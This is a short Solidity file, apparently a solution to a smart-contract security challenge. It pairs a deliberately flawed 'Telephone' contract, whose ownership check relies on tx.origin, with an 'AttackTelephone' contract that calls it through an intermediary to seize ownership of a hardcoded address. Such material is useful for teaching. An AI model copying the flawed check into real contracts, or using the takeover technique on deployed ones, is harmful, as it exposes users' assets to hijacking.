// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackTelephone {
    Telephone telephone = Telephone(0x70cc1a48092298d4eA0b12FD744EF41CE8236C38);
    function attackChangeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}